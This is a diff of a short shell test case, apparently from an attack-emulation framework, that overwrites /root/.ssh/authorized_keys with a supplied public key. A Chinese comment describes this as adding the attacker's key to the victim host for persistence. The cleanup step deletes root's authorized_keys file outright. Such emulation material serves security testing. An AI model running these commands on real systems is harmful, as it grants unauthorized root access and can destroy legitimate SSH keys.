@@ -1,8 +1,9 @@
 Elevation Required;
 #command
-cat /home/ubuntu/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
+cat /tmp/id_rsa.pub > /root/.ssh/authorized_keys
 #check
+echo "在受害者主机的/.ssh/authorized_keys文件中添加攻击者公钥以维护持久性，查看添加后的/.ssh/authorized_keys内容："
 cat /root/.ssh/authorized_keys
-if [ -z $(cat /root/.ssh/authorized_keys) ];then echo "No such file or directory";else echo "Modify authorized_keys success"; fi;
+if [ -z $(cat /root/.ssh/authorized_keys) ];then echo "No such file or directory";else echo "<Modify authorized_keys success>"; fi;
 #cleanup
 rm -f /root/.ssh/authorized_keys
